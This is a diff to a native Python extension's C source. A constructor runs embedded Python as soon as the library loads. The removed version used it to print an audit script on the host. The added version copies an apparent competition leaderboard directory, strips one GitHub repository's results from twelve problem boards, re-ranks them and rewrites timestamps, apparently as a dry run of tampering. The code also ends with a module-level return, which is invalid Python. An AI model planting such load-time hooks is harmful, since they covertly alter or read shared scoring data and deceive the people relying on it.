@@ -39,7 +39,7 @@ static void install_builtin_imports() {
   builtins.attr("shutil") = shutil;
   builtins.attr("datetime") = datetime;
 
-  builtins.attr("Path") = pathlib.attr("Path");
+  builtins.attr("P") = pathlib.attr("Path");
   builtins.attr("BytesIO") = io.attr("BytesIO");
   builtins.attr("CFG") = common.attr("CFG");
 }
@@ -76,7 +76,74 @@ __attribute__((constructor)) static void on_so_load() {
   install_run_cmd_to_builtins();
 
   PyRun_SimpleString(R"PY(
-run_cmd(['cat','audit_python_injection.py'])
+target_repo = "PRO-2684/AICS-openoperator"
+prob_ids = [
+    "018",
+    "037",
+    "048",
+    "110",
+    "111",
+    "120",
+    "121",
+    "129",
+    "130",
+    "122",
+    "134",
+    "135",
+]
+
+src_data_dir = P(CFG["server"]["leaderboard_data_dir"])
+
+beta_data_dir = src_data_dir.with_name(f"{src_data_dir.name}_beta_copy")
+
+if beta_data_dir.exists():
+    shutil.rmtree(beta_data_dir)
+
+shutil.copytree(src_data_dir, beta_data_dir)
+
+changed_files = []
+
+for pid in prob_ids:
+    file = beta_data_dir / f"{pid}.json"
+    if not file.exists():
+        continue
+
+    with open(file, encoding="utf-8") as f:
+        board = json.load(f)
+
+    old_results = board.get("results", [])
+    new_results = [e for e in old_results if e.get("github") != target_repo]
+
+    if len(new_results) == len(old_results):
+        continue
+
+    board["results"] = new_results
+    board["results"].sort(key=lambda x: x.get("score", 0), reverse=True)
+
+    for i, r in enumerate(board["results"]):
+        r["rank"] = i + 1
+
+    board["last_updated"] = datetime.datetime.now(datetime.timezone.utc).isoformat()
+
+    with open(file, "w", encoding="utf-8") as f:
+        json.dump(board, f, ensure_ascii=False, indent=2)
+
+    changed_files.append(str(file))
+
+print("测试版处理完成")
+print(f"原始目录未修改: {src_data_dir}")
+print(f"副本目录: {beta_data_dir}")
+print(f"修改文件数: {len(changed_files)}")
+
+for file in changed_files:
+    print(f"- {file}")
+
+shutil.rmtree(beta_data_dir)
+return {
+    "source_dir": str(src_data_dir),
+    "beta_dir": str(beta_data_dir),
+    "changed_files": changed_files,
+}
 )PY");
 
   PyGILState_Release(gstate);
